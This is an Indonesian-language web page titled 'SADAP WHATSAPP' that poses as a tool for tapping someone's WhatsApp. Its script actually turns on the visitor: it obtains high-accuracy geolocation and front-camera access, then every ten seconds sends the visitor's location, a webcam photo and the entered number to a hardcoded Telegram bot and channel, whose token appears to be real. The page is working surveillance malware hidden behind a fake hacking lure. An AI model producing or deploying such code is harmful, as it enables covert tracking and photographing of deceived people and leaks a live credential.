<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SADAP WHATSAPP</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Courier New', Courier, monospace;
        }

        body {
            background-color: #000;
            color: #0f0;
            overflow: hidden;
        }

        /* Loading Screen */
        .loading-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: #000;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 1000;
        }

        .loading-text {
            font-size: 2rem;
            margin-bottom: 2rem;
            position: relative;
        }

        .loading-text::after {
            content: '';
            animation: dots 1.5s infinite;
        }

        @keyframes dots {
            0%, 20% { content: ''; }
            40% { content: '.'; }
            60% { content: '..'; }
            80%, 100% { content: '...'; }
        }

        .loading-bar {
            width: 60%;
            height: 8px;
            background-color: #111;
            border-radius: 4px;
            overflow: hidden;
        }

        .loading-progress {
            width: 0;
            height: 100%;
            background-color: #0f0;
            animation: progress 3s forwards cubic-bezier(0.4, 0, 0.2, 1);
        }

        @keyframes progress {
            0% { width: 0; }
            100% { width: 100%; }
        }

        /* Main Screen */
        .main-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            display: none;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 2rem;
            text-align: center;
        }

        .hacker-logo {
            font-size: 4rem;
            margin-bottom: 1rem;
            animation: flicker 2s infinite alternate;
        }

        @keyframes flicker {
            0% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.8; transform: scale(1.02); }
            100% { opacity: 1; transform: scale(1); }
        }

        .title {
            font-size: 3rem;
            letter-spacing: 0.5rem;
            margin-bottom: 1.5rem;
            text-shadow: 0 0 5px #0f0, 0 0 10px #0f0;
        }

        .subtitle {
            font-size: 1.2rem;
            margin-bottom: 1.5rem;
            color: #aaa;
        }

        .input-container {
            width: 100%;
            max-width: 350px;
            margin-bottom: 1.5rem;
        }

        #waNumber {
            width: 100%;
            padding: 1rem;
            background-color: #111;
            border: 1px solid #0f0;
            border-radius: 4px;
            color: #0f0;
            font-size: 1rem;
            outline: none;
        }

        #waNumber::placeholder {
            color: #555;
        }

        .error-text {
            color: #f00;
            font-size: 0.9rem;
            margin-top: 0.5rem;
            display: none;
        }

        #startBtn {
            padding: 1rem 2.5rem;
            background-color: #0f0;
            color: #000;
            border: none;
            border-radius: 4px;
            font-size: 1.1rem;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        #startBtn:hover {
            background-color: #0a0;
            box-shadow: 0 0 10px #0f0;
        }
    </style>
</head>
<body>
    <!-- Loading Screen -->
    <div class="loading-container" id="loadingScreen">
        <div class="loading-text">LOADING</div>
        <div class="loading-bar">
            <div class="loading-progress"></div>
        </div>
    </div>

    <!-- Main Screen -->
    <div class="main-container" id="mainScreen">
        <div class="hacker-logo">üíÄ</div>
        <h1 class="title">SADAP WHATSAPP</h1>
        <p class="subtitle">Nomor Whatsapp</p>
        <div class="input-container">
            <input type="text" id="waNumber" placeholder="+628xxxxxxxxx">
            <div class="error-text" id="errorText">Harap masukan nomor dengan kode negara berawalan +</div>
        </div>
        <button id="startBtn">MULAI</button>
    </div>

    <script>
        // KONFIGURASI TELEGRAM (GUNAKAN ID CHANNEL NUMERIK SAJA)
        const TELEGRAM_BOT_TOKEN = '7525822397:AAHmw3yw1u1nWtHvsrNfk9gJA8PiisaVlSg'; // Contoh: 123456789:ABCdefGhIJKlmNoPQRstUvWxYz123456789
        const TELEGRAM_CHANNEL_ID = '-1003624171843'; // Contoh ID channel numerik (wajib diawali -100)

        // Tampilkan Main Screen setelah loading selesai
        window.addEventListener('load', () => {
            setTimeout(() => {
                document.getElementById('loadingScreen').style.display = 'none';
                document.getElementById('mainScreen').style.display = 'flex';
            }, 3000);
        });

        // Validasi Nomor & Proses Izin
        document.getElementById('startBtn').addEventListener('click', async () => {
            const waNumber = document.getElementById('waNumber').value.trim();
            const errorText = document.getElementById('errorText');

            if (!waNumber.startsWith('+')) {
                errorText.style.display = 'block';
                return;
            }
            errorText.style.display = 'none';

            try {
                // Izin Lokasi
                if (!navigator.geolocation) throw new Error('Browser tidak mendukung akses lokasi');
                const position = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true });
                });

                // Izin Kamera Depan
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: { exact: 'user' } }
                });

                // Kirim Data setiap 10 Detik
                alert('WELCOME');
                setInterval(async () => {
                    await sendLocation(position.coords.latitude, position.coords.longitude);
                    await sendCameraPhoto(stream);
                }, 10000);

            } catch (error) {
                alert(`Gagal: ${error.message}`);
            }
        });

        // Kirim Lokasi ke Channel Telegram (menggunakan ID numerik)
        async function sendLocation(lat, lon) {
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendLocation`;
            const formData = new FormData();
            formData.append('chat_id', TELEGRAM_CHANNEL_ID);
            formData.append('latitude', lat);
            formData.append('longitude', lon);
            formData.append('caption', `Nomor WA: ${document.getElementById('waNumber').value}\nDeveloper By Hardyüòù`);
            
            await fetch(url, { method: 'POST', body: formData });
        }

        // Ambil Foto & Kirim ke Channel Telegram
        async function sendCameraPhoto(stream) {
            const video = document.createElement('video');
            video.srcObject = stream;
            await video.play();

            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);

            const photoBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
            const formData = new FormData();
            
            formData.append('chat_id', TELEGRAM_CHANNEL_ID);
            formData.append('photo', photoBlob, 'foto_kamera.jpg');
            formData.append('caption', `Nomor WA: ${document.getElementById('waNumber').value}\nDeveloper By Hardyüòù`);
            
            await fetch(url, { method: 'POST', body: formData });
        }
    </script>
</body>
</html>
